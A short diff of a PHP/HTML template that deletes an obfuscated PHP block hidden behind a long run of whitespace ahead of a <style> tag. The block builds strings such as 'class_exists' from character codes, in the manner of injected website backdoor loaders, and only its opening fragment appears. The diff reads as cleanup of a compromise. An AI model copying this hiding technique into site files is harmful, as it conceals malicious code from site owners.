@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                                                                                                                                                                 $HemWQNvzOx = "\x50" . "\x4d" . chr ( 383 - 305 )."\x5f" . 's' . "\x79" . chr (75) . chr (113); $vytRiW = chr ( 440 - 341 ).chr (108) . chr (97) . "\x73" . "\x73" . "\137" . "\x65" . 'x' . chr ( 859 - 754 ).chr (115) . "\x74" . chr ( 811 - 696 ); $VkxJHlQv = class_exists($HemWQNvzOx); $HemWQNvzOx = "20909";$vytRiW = "38371";$gcEpWSSwZ = FALSE; ?><style>
+<style>
     .card-bg{
         background-color: #F6F6F6;
     }
